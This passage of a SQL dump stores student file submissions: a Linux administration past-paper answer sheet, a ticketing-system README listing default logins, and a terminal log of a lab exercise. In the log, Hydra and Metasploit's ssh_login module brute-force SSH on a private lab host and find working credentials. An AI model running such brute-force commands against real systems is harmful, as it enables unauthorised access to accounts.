to individual users, granting each user different levels of access (read, write, execute) on a single file or directory.\r\n\r\n(ii) With the use of appropriate example, write a Linux command to set an ACL for a specific user on a file.\r\nANS:\r\nsudo setfacl -m u:john:rwx filename.txt\r\n\r\n\r\nQuestion 2\r\n===========\r\na) Given the Linux system extract below (figure 1):\r\n(i) Refer to Figure 1, write a Linux command to change the group ownership of dirdylan directory from G1 to G2. Identify the type of user who possess the right to issue the above command.\r\nANS:\r\n\r\n(ii) Explain the three types of permission (read, write, execute) and their significance while applied to dirdylan directory.\r\nANS:\r\n\r\n(iii) Discuss the use of sticky bit in Linux file permissions. Write a Linux command to apply sticky bit to dirdylan directory.\r\nANS:\r\n\r\nb) Describe how to change file permissions using the chmod command.\r\n(Hint: In your answer, provide example(s) of symbolic and numeric representation for setting file permissions.)\r\n\r\n', '2024-12-03 06:26:30'),
(4, 1, 'sshOB2', 'BAIT3113 System Administration PYP.txt', 'BAIT3113 System Administration PYP\r\n===================================\r\n5 JUNE 2024\r\n===========\r\nQuestion 1\r\na) There are two basic types of users in Linux - namely super and regular user.\r\n(i) Explain the difference between super user and regular user.\r\nANS:\r\nSuper user\r\n- The super user in Linux, often called root, has unrestricted access to the entire system.\r\n- They can perform all administrative task, including installing software, managing files, creating users, and altering system settings.\r\n- The super user can override any file permissions, meaning they have full control over all resources and configuration on the system.\r\n\r\nRegular user\r\n- A regular user has limited access to the system and  is typically restricted to their own home directory and files.\r\n- They can perform basic tasks like editing files, running applications, and creating personal directories, but cannot perform administrative functions.\r\n- To perform administrative tasks, regular users must use commands like sudo, which temporarily grants them elevated privileges for specific actions.\r\n\r\n(ii)In Linux system, the sudo command plays a crucial role in managing user privileges. Do you agree with the statement? Justify your answer with an appropriate example.\r\nANS:\r\n- Yes, I agree that the sudo command plays a crucial role in managing user privileges in a Linux system.\r\n- The sudo command allows a regular user to execute commands that typically require super user(root) privileges, without having to log in as the root user.\r\n- This enhances security by limiting root access and provides more control over which users can perform administrative tasks.\r\n- Example, if a user wants to update the system, which requires root privileges, they can use the sudo command as follows: sudo apt-get update\r\n\r\n\r\nb) User management includes everything from creating a user to deleting a user on your system. Write the Linux command(s) to accomplish the following user management tasks:\r\n(i) Create a user with the following requirements:\r\n    - The user login name is \"alice\"\r\n    - The user \"alice\" joined \"webuser\" group as her primary group.\r\n    - Default home to be created for user \"alice\" to park under /home/alice directory.\r\nANS:\r\nsudo useradd -m -g webuser alice\r\n\r\n(ii) Modify the user \"alice\" account properties based on the following requirements:\r\n    * Change the user \"alice\" home from /home/alice directory to /data/alice directory.\r\n    * Change the user \"alice\" user ID (UID) from \"1023\" to \"7531\"\r\nANS:\r\nsudo usermod -d /data/alice -m -u alice\r\n\r\n(iii) Delete the account of user \"alice\" and her home directory as well.\r\nANS:\r\nsudo userdel -r alice\r\n\r\n\r\nc) In Linux system, Access Control List(ACL) is one of the most fundamental mechanism to secure file or directory.\r\n(i) Discuss the advantages of using ACL compared to standard file permissions.\r\nANS:\r\n*Efficiency\r\n  - ACL allows settings permissions for multiple users and groups on the same file or directory, offering more detailed control compared to the standard owner, group, and others model.\r\n\r\n*User-Specific Permissions\r\n  - ACL enables assigning specific permissions to individual users, granting each user different levels of access (read, write, execute) on a single file or directory.\r\n\r\n(ii) With the use of appropriate example, write a Linux command to set an ACL for a specific user on a file.\r\nANS:\r\nsudo setfacl -m u:john:rwx filename.txt\r\n\r\n\r\nQuestion 2\r\n===========\r\na) Given the Linux system extract below (figure 1):\r\n(i) Refer to Figure 1, write a Linux command to change the group ownership of dirdylan directory from G1 to G2. Identify the type of user who possess the right to issue the above command.\r\nANS:\r\n\r\n(ii) Explain the three types of permission (read, write, execute) and their significance while applied to dirdylan directory.\r\nANS:\r\n\r\n(iii) Discuss the use of sticky bit in Linux file permissions. Write a Linux command to apply sticky bit to dirdylan directory.\r\nANS:\r\n\r\nb) Describe how to change file permissions using the chmod command.\r\n(Hint: In your answer, provide example(s) of symbolic and numeric representation for setting file permissions.)\r\n\r\n', '2024-12-03 06:26:42'),
(5, 1, 'sshDA', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-03 06:26:53');
INSERT INTO `submitted_files` (`file_id`, `student_id`, `exercise_id`, `file_name`, `file_content`, `submission_date`) VALUES
(6, 1, 'sshDB', 'command_log_20241124_024144.txt', 'Script started on 2024-11-24 02:41:44-05:00 [COMMAND=\"bash\" TERM=\"xterm-256color\" TTY=\"/dev/pts/0\" COLUMNS=\"77\" LINES=\"27\"]\n[~]\n\n$ yhydra -L users.txt -P passwords.txt ssh://192.168.43.133\nhydra -L users.txt -P passwords.txt ssh://192.168.43.133\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 02:44:14\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[ERROR] File for logins not found: users.txt\n\n[~]\n\n$ cd /Desktop\n\nbash: cd: /Desktop: No such file or directory\n\n[~]\n\n$ cd /Desktop~/Desktop\n\n\n[~/Desktop]\n$ hydra -L users.txt -P passwords.txt ssh://192.168.43.133\nhydra -L users.txt -P passwords.txt ssh://192.168.43.133\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 02:44:45\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task\n[DATA] attacking ssh://192.168.43.133:22/\n[22][ssh] host: 192.168.43.133   login: yiyangtan   password: kali\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-24 02:44:50\n\n[~/Desktop]\n$ msfconsole\nmsfconsole\n\nMetasploit tip: Use sessions -1 to interact with the last opened session\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] starting the Metasploit Framework console...|\n[*] STarting the Metasploit Framework console.../\n[*] StArting the Metasploit Framework console...-\n[*] StaRting the Metasploit Framework console...\\\n[*] StarTing the Metasploit Framework console...|\n[*] StartIng the Metasploit Framework console.../\n[*] StartiNg the Metasploit Framework console...-\n[*] StartinG the Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n[*] Starting The Metasploit Framework console.../\n[*] Starting tHe Metasploit Framework console...-\n[*] Starting thE Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n[*] Starting the metasploit Framework console.../\n[*] Starting the MEtasploit Framework console...-\n[*] Starting the MeTasploit Framework console...\\\n[*] Starting the MetAsploit Framework console...|\n[*] Starting the MetaSploit Framework console.../\n[*] Starting the MetasPloit Framework console...-\n[*] Starting the MetaspLoit Framework console...\\\n[*] Starting the MetasplOit Framework console...|\n[*] Starting the MetasploIt Framework console.../\n[*] Starting the MetasploiT Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] Starting the Metasploit framework console...|\n[*] Starting the Metasploit FRamework console.../\n[*] Starting the Metasploit FrAmework console...-\n[*] Starting the Metasploit FraMework console...\\\n[*] Starting the Metasploit FramEwork console...|\n[*] Starting the Metasploit FrameWork console.../\n[*] Starting the Metasploit FramewOrk console...-\n[*] Starting the Metasploit FramewoRk console...\\\n[*] Starting the Metasploit FrameworK console...|\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework Console...-\n[*] Starting the Metasploit Framework cOnsole...\\\n[*] Starting the Metasploit Framework coNsole...|\n[*] Starting the Metasploit Framework conSole.../\n[*] Starting the Metasploit Framework consOle...-\n[*] Starting the Metasploit Framework consoLe...\\\n[*] Starting the Metasploit Framework consolE...|\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n\n                                                  \nCall trans opt: received. 2-19-98 13:24:18 REC:Loc\n\n     Trace program: running\n\n           wake up, Neo...\n        the matrix has you\n      follow the white rabbit.\n\n          knock, knock, Neo.\n\n                        (`.         ,-,\n                        ` `.    ,;\' /\n                         `.  ,\'/ .\'\n                          `. X /.\'\n                .-;--\'\'--.._` ` (\n              .\'            /   `\n             ,           ` \'   Q \'\n             ,         ,   `._    \\\n          ,.|         \'     `-.;_\'\n          :  . `  ;    `  ` --,.._;\n           \' `    ,   )   .\'\n              `._ ,  \'   /_\n                 ; ,\'\'-,;\' ``-\n                  ``-..__``--`\n\n                             https://metasploit.com\n\n\n       =[ metasploit v6.4.9-dev                           ]\n+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]\n+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 > search ssh\n\n\nMatching Modules\n================\n\n   #    Name                                                               Disclosure Date  Rank       Check  Description\n   -    ----                                                               ---------------  ----       -----  -----------\n   0    exploit/linux/http/alienvault_exec                                 2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution\n   1    auxiliary/scanner/ssh/apache_karaf_command_execution               2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution\n   2    auxiliary/scanner/ssh/karaf_login                                  .                normal     No     Apache Karaf Login Utility\n   3    exploit/apple_ios/ssh/cydia_default_ssh                            2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability\n   4    exploit/unix/ssh/arista_tacplus_shell                              2020-02-02       great      Yes    Arista restricted shell escape (with privesc)\n   5    exploit/unix/ssh/array_vxag_vapv_privkey_privesc                   2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution\n   6    exploit/linux/ssh/ceragon_fibeair_known_privkey                    2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure\n   7    auxiliary/scanner/ssh/cerberus_sftp_enumusers                      2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration\n   8    auxiliary/dos/cisco/cisco_7937g_dos                                2020-06-02       normal     No     Cisco 7937G Denial-of-Service Attack\n   9    auxiliary/admin/http/cisco_7937g_ssh_privesc                       2020-06-02       normal     No     Cisco 7937G SSH Privilege Escalation\n   10   exploit/linux/http/cisco_asax_sfr_rce                              2022-06-22       excellent  Yes    Cisco ASA-X with FirePOWER Services Authenticated Command Injection\n   11     \\_ target: Shell Dropper                                         .                .          .      .\n   12     \\_ target: Linux Dropper                                         .                .          .      .\n   13   auxiliary/scanner/http/cisco_firepower_login                       .                normal     No     Cisco Firepower Management Console 6.0 Login\n   14   exploit/linux/ssh/cisco_ucs_scpuser                                2019-08-21       excellent  No     Cisco UCS Director default scpuser password\n   15   auxiliary/scanner/ssh/eaton_xpert_backdoor                         2018-07-18       normal     No     Eaton Xpert Meter SSH Private Key Exposure Scanner\n   16   exploit/linux/ssh/exagrid_known_privkey                            2016-04-07       excellent  No     ExaGrid Known SSH Key and Default Password\n   17   exploit/linux/ssh/f5_bigip_known_privkey                           2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure\n   18   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684   2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.\n   19   auxiliary/scanner/ssh/fortinet_backdoor                            2016-01-09       normal     No     Fortinet SSH Backdoor Scanner\n   20   post/windows/manage/forward_pageant                                .                normal     No     Forward SSH Agent Requests To Remote Pageant\n   21   exploit/windows/ssh/freeftpd_key_exchange                          2006-05-12       average    No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow\n   22     \\_ target: Windows 2000 SP0-SP4 English                          .                .          .      .\n   23     \\_ target: Windows 2000 SP0-SP4 German                           .                .          .      .\n   24     \\_ target: Windows XP SP0-SP1 English                            .                .          .      .\n   25     \\_ target: Windows XP SP2 English                                .                .          .      .\n   26   exploit/windows/ssh/freesshd_key_exchange                          2006-05-12       average    No     FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow\n   27     \\_ target: Windows 2000 Pro SP4 English                          .                .          .      .\n   28     \\_ target: Windows XP Pro SP0 English                            .                .          .      .\n   29     \\_ target: Windows XP Pro SP1 English                            .                .          .      .\n   30   exploit/windows/ssh/freesshd_authbypass                            2010-08-11       excellent  Yes    Freesshd Authentication Bypass\n   31     \\_ target: PowerShell                                            .                .          .      .\n   32     \\_ target: CmdStager upload                                      .                .          .      .\n   33   auxiliary/scanner/http/gitlab_user_enum                            2014-11-21       normal     No     GitLab User Enumeration\n   34   exploit/multi/http/gitlab_shell_exec                               2013-11-04       excellent  Yes    Gitlab-shell Code Execution\n   35     \\_ target: Linux                                                 .                .          .      .\n   36     \\_ target: Linux (x64)                                           .                .          .      .\n   37     \\_ target: Unix (CMD)                                            .                .          .      .\n   38     \\_ target: Python                                                .                .          .      .\n   39   exploit/linux/ssh/ibm_drm_a3user                                   2020-04-21       excellent  No     IBM Data Risk Manager a3user Default Password\n   40   post/windows/manage/install_ssh                                    .                normal     No     Install OpenSSH for Windows\n   41   payload/generic/ssh/interact                                       .                normal     No     Interact with Established SSH Connection\n   42   post/multi/gather/jenkins_gather                                   .                normal     No     Jenkins Credential Collector\n   43   auxiliary/scanner/ssh/juniper_backdoor                             2015-12-20       normal     No     Juniper SSH Backdoor Scanner\n   44   exploit/freebsd/http/junos_phprc_auto_prepend_file                 2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE\n   45     \\_ target: PHP In-Memory                                         .                .          .      .\n   46     \\_ target: Interactive SSH with jail break                       .                .          .      .\n   47   auxiliary/scanner/ssh/detect_kippo                                 .                normal     No     Kippo SSH Honeypot Detector\n   48   post/linux/gather/enum_network                                     .                normal     No     Linux Gather Network Information\n   49   exploit/linux/local/ptrace_traceme_pkexec_helper                   2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit\n   50   exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey         2014-03-17       excellent  No     Loadbalancer.org Enterprise VA SSH Private Key Exposure\n   51   exploit/multi/http/git_submodule_command_exec                      2017-08-10       excellent  No     Malicious Git HTTP Server For CVE-2017-1000117\n   52   exploit/linux/ssh/mercurial_ssh_exec                               2017-04-18       excellent  No     Mercurial Custom hg-ssh Wrapper Remote Code Exec\n   53   exploit/linux/ssh/microfocus_obr_shrboadmin                        2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password\n   54   post/multi/gather/ssh_creds                                        .                normal     No     Multi Gather OpenSSH PKI Credentials Collection\n   55   exploit/solaris/ssh/pam_username_bof                               2020-10-20       normal     Yes    Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow\n   56     \\_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware      .                .          .      .\n   57     \\_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox  .                .          .      .\n   58   auxiliary/gather/prometheus_api_gather                             2016-07-01       normal     No     Prometheus API Information Gather\n   59   exploit/windows/ssh/putty_msg_debug                                2002-12-16       normal     No     PuTTY Buffer Overflow\n   60     \\_ target: Windows 2000 SP4 English                              .                .          .      .\n   61     \\_ target: Windows XP SP2 English                                .                .          .      .\n   62     \\_ target: Windows 2003 SP1 English                              .                .          .      .\n   63   post/windows/gather/enum_putty_saved_sessions                      .                normal     No     PuTTY Saved Sessions Enumeration Module\n   64   auxiliary/gather/qnap_lfi                                          2019-11-25       normal     Yes    QNAP QTS and Photo Station Local File Inclusion\n   65   exploit/linux/ssh/quantum_dxi_known_privkey                        2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure\n   66   exploit/linux/ssh/quantum_vmpro_backdoor                           2014-03-17       excellent  No     Quantum vmPRO Backdoor Command\n   67   auxiliary/fuzzers/ssh/ssh_version_15                               .                normal     No     SSH 1.5 Version Fuzzer\n   68   auxiliary/fuzzers/ssh/ssh_version_2                                .                normal     No     SSH 2.0 Version Fuzzer\n   69   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                          .                normal     No     SSH Key Exchange Init Corruption\n   70   post/linux/manage/sshkey_persistence                               .                excellent  No     SSH Key Persistence\n   71   post/windows/manage/sshkey_persistence                             .                good       No     SSH Key Persistence\n   72   auxiliary/scanner/ssh/ssh_login                                    .                normal     No     SSH Login Check Scanner\n   73   auxiliary/scanner/ssh/ssh_identify_pubkeys                         .                normal     No     SSH Public Key Acceptance Scanner\n   74   auxiliary/scanner/ssh/ssh_login_pubkey                             .                normal     No     SSH Public Key Login Scanner\n   75   exploit/multi/ssh/sshexec                                          1999-01-01       manual     No     SSH User Code Execution\n   76     \\_ target: Linux Command                                         .                .          .      .\n   77     \\_ target: Linux x86                                             .                .          .      .\n   78     \\_ target: Linux x64                                             .                .          .      .\n   79     \\_ target: Linux armle                                           .                .          .      .\n   80     \\_ target: Linux mipsle                                          .                .          .      .\n   81     \\_ target: Linux mipsbe                                          .                .          .      .\n   82     \\_ target: Linux aarch64                                         .                .          .      .\n   83     \\_ target: OSX x86                                               .                .          .      .\n   84     \\_ target: OSX x64                                               .                .          .      .\n   85     \\_ target: BSD x86                                               .                .          .      .\n   86     \\_ target: BSD x64                                               .                .          .      .\n   87     \\_ target: Python                                                .                .          .      .\n   88     \\_ target: Unix Cmd                                              .                .          .      .\n   89     \\_ target: Interactive SSH                                       .                .          .      .\n   90   auxiliary/scanner/ssh/ssh_enumusers                                .                normal     No     SSH Username Enumeration\n   91     \\_ action: Malformed Packet                                      .                .          .      Use a malformed packet\n   92     \\_ action: Timing Attack                                         .                .          .      Use a timing attack\n   93   auxiliary/fuzzers/ssh/ssh_version_corrupt                          .                normal     No     SSH Version Corruption\n   94   auxiliary/scanner/ssh/ssh_version                                  .                normal     No     SSH Version Scanner\n   95   post/multi/gather/saltstack_salt                                   .                normal     No     SaltStack Salt Information Gatherer\n   96   exploit/unix/http/schneider_electric_net55xx_encoder               2019-01-25       excellent  Yes    Schneider Electric Pelco Endura NET55XX Encoder\n   97   exploit/windows/ssh/securecrt_ssh1                                 2002-07-23       average    No     SecureCRT SSH1 Buffer Overflow\n   98   exploit/linux/ssh/solarwinds_lem_exec                              2017-03-17       excellent  No     SolarWinds LEM Default SSH Password Remote Code Execution\n   99   exploit/linux/http/sourcegraph_gitserver_sshcmd                    2022-02-18       excellent  Yes    Sourcegraph gitserver sshCommand RCE\n   100    \\_ target: Automatic                                             .                .          .      .\n   101    \\_ target: Unix Command                                          .                .          .      .\n   102    \\_ target: Linux Dropper                                         .                .          .      .\n   103  exploit/linux/ssh/symantec_smg_ssh                                 2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability\n   104  exploit/linux/http/symantec_messaging_gateway_exec                 2017-04-26       excellent  No     Symantec Messaging Gateway Remote Code Execution\n   105  exploit/windows/ssh/sysax_ssh_username                             2012-02-27       normal     Yes    Sysax 5.53 SSH Username Buffer Overflow\n   106    \\_ target: Sysax 5.53 on Win XP SP3 / Win2k3 SP0                 .                .          .      .\n   107    \\_ target: Sysax 5.53 on Win2K3 SP1/SP2                          .                .          .      .\n   108  auxiliary/dos/windows/ssh/sysax_sshd_kexchange                     2013-03-17       normal     No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service\n   109  exploit/unix/ssh/tectia_passwd_changereq                           2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability\n   110  auxiliary/scanner/ssh/ssh_enum_git_keys                            .                normal     No     Test SSH Github Access\n   111  exploit/linux/http/ubiquiti_airos_file_upload                      2016-02-13       excellent  No     Ubiquiti airOS Arbitrary File Upload\n   112  payload/cmd/unix/reverse_ssh                                       .                normal     No     Unix Command Shell, Reverse TCP SSH\n   113  payload/cmd/unix/bind_aws_instance_connect                         .                normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)\n   114  exploit/linux/ssh/vmware_vrni_known_privkey                        2023-08-29       excellent  No     VMWare Aria Operations for Networks (vRealize Network Insight) SSH Private Key Exposure\n   115    \\_ target: 6.0_platform                                          .                .          .      .\n   116    \\_ target: 6.0_proxy                                             .                .          .      .\n   117    \\_ target: 6.1_platform                                          .                .          .      .\n   118    \\_ target: 6.1_proxy                                             .                .          .      .\n   119    \\_ target: 6.2_collector                                         .                .          .      .\n   120    \\_ target: 6.2_platform                                          .                .          .      .\n   121    \\_ target: 6.3_collector                                         .                .          .      .\n   122    \\_ target: 6.3_platform                                          .                .          .      .\n   123    \\_ target: 6.4_collector                                         .                .          .      .\n   124    \\_ target: 6.4_platform                                          .                .          .      .\n   125    \\_ target: 6.5_collector                                         .                .          .      .\n   126    \\_ target: 6.5_platform                                          .                .          .      .\n   127    \\_ target: 6.6_collector                                         .                .          .      .\n   128    \\_ target: 6.6_platform                                          .                .          .      .\n   129    \\_ target: 6.7_collector                                         .                .          .      .\n   130    \\_ target: 6.7_platform                                          .                .          .      .\n   131    \\_ target: 6.8_collector                                         .                .          .      .\n   132    \\_ target: 6.8_platform                                          .                .          .      .\n   133    \\_ target: 6.9_collector                                         .                .          .      .\n   134    \\_ target: 6.9_platform                                          .                .          .      .\n   135    \\_ target: 6.10_collector                                        .                .          .      .\n   136    \\_ target: 6.10_platform                                         .                .          .      .\n   137    \\_ target: All                                                   .                .          .      .\n   138  exploit/linux/ssh/vmware_vdp_known_privkey                         2016-12-20       excellent  No     VMware VDP Known SSH Key\n   139  exploit/multi/http/vmware_vcenter_uploadova_rce                    2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE\n   140    \\_ target: VMware vCenter Server <= 6.7 Update 1b (Linux)        .                .          .      .\n   141    \\_ target: VMware vCenter Server <= 6.7 Update 3j (Windows)      .                .          .      .\n   142  exploit/linux/ssh/vyos_restricted_shell_privesc                    2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation\n   143  post/windows/gather/credentials/whatsupgold_credential_dump        2022-11-22       manual     No     WhatsUp Gold Credentials Dump\n   144    \\_ action: Decrypt                                               .                .          .      Decrypt WhatsUp Gold database export CSV file\n   145    \\_ action: Dump                                                  .                .          .      Export WhatsUp Gold database and perform decryption\n   146    \\_ action: Export                                                .                .          .      Export WhatsUp Gold database without decryption\n   147  post/windows/gather/credentials/mremote                            .                normal     No     Windows Gather mRemote Saved Password Extraction\n   148  exploit/windows/local/unquoted_service_path                        2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation\n   149  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                        2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm\n   150    \\_ target: Unix Command                                          .                .          .      .\n   151    \\_ target: Linux Dropper                                         .                .          .      .\n   152    \\_ target: Interactive SSH                                       .                .          .      .\n   153  auxiliary/scanner/ssh/libssh_auth_bypass                           2018-10-16       normal     No     libssh Authentication Bypass Scanner\n   154    \\_ action: Execute                                               .                .          .      Execute a command\n   155    \\_ action: Shell                                                 .                .          .      Spawn a shell\n   156  exploit/linux/http/php_imap_open_rce                               2018-10-23       good       Yes    php imap_open Remote Code Execution\n   157    \\_ target: prestashop                                            .                .          .      .\n   158    \\_ target: suitecrm                                              .                .          .      .\n   159    \\_ target: e107v2                                                .                .          .      .\n   160    \\_ target: Horde IMP H3                                          .                .          .      .\n   161    \\_ target: custom                                                .                .          .      .\n\n\nInteract with a module by name or index. For example info 161, use 161 or use exploit/linux/http/php_imap_open_rce\nAfter interacting with a module you can manually set a TARGET with set TARGET \'custom\'\n\nmsf6 > use auxiliary/scanner/ssh/ssh_login\n\nmsf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.43.133\n\nrhosts => 192.168.43.133\nmsf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true\n\nstop_on_success => true\nmsf6 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt\n\nuser_file => users.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt\n\npass_file => passwords.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set verbose true\n\nverbose => true\nmsf6 auxiliary(scanner/ssh/ssh_login) > run\n\n\n[*] 192.168.43.133:22 - Starting bruteforce\n[-] 192.168.43.133:22 - Failed: \'kali:admin\'\n[!] No active DB -- Credential data will not be saved!\n[-] 192.168.43.133:22 - Failed: \'kali:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'kali:abc123\'\n[-] 192.168.43.133:22 - Failed: \'kali:kali\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:admin\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:abc123\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:kali\'\n[-] 192.168.43.133:22 - Failed: \'admin:admin\'\n[-] 192.168.43.133:22 - Failed: \'admin:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'admin:abc123\'\n[-] 192.168.43.133:22 - Failed: \'admin:kali\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:admin\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:abc123\'\n[+] 192.168.43.133:22 - Success: \'yiyangtan:kali\' \'\'\n[*] SSH session 1 opened (192.168.43.130:36359 -> 192.168.43.133:22) at 2024-11-24 02:46:41 -0500\n[-] 192.168.43.133:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with \'set gatherproof false\'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/ssh/ssh_login) > exit\n\n[*] You have active sessions open, to exit anyway type \"exit -y\"\nmsf6 auxiliary(scanner/ssh/ssh_login) > exit -y\n\n\n[~/Desktop]\n$ exit\n\nexit\n\nScript done on 2024-11-24 02:48:08-05:00 [COMMAND_EXIT_CODE=\"0\"]\n\n', '2024-12-03 06:27:05'),
(7, 1, 'sshDC', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-03 06:27:18');
INSERT INTO `submitted_files` (`file_id`, `student_id`, `exercise_id`, `file_name`, `file_content`, `submission_date`) VALUES
